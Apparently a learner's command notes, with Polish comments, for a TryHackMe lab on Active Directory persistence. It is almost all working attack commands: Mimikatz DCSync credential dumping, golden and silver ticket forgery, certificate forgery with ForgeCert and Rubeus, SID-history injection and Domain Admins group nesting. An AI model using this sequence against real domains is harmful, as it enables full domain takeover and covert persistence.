# jako administrator
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
lsadump::dcsync /domain:za.tryhackme.loc /user:louis.cole
lsadump::dcsync /domain:za.tryhackme.loc /user:krbtgt@za.tryhackme.loc

log BazaDanych_dcdump.txt 
lsadump::dcsync /domain:za.tryhackme.loc /all

# golden ticket, wymagany hash krbtgt
powershell
Get-ADDomain
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt
dir \\thmdc.za.tryhackme.loc\c$\
#silver
lsadump::dcsync /domain:za.tryhackme.loc /user:THMSERVER1$
kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:THMSERVER1.za.tryhackme.loc /rc4:4c02d970f7b3da7f8ab6fa4dc77438f4 /service:cifs /ptt
dir \\thmserver1.za.tryhackme.loc\c$\
# golden certyficat trzeba na głównym kontrolerze
mkdir aaa
cd aaa
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
crypto::certificates /systemstore:local_machine
privilege::debug
crypto::capi
crypto::cng
crypto::certificates /systemstore:local_machine /export
# pobrać certyfikat używając SCP
C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 
C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
kerberos::ptt administrator.kirbi
dir \\THMDC.za.tryhackme.loc\c$\

#SID
powershell
Get-ADUser <your ad username> -properties sidhistory,memberof
Get-ADGroup "Domain Admins"
Stop-Service -Name ntds -force 
Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit 
Start-Service -Name ntds 

powershell
Get-ADUser aaron.jones -Properties sidhistory 
dir \\thmdc.za.tryhackme.loc\c$

#group membership
C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup5"
C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"

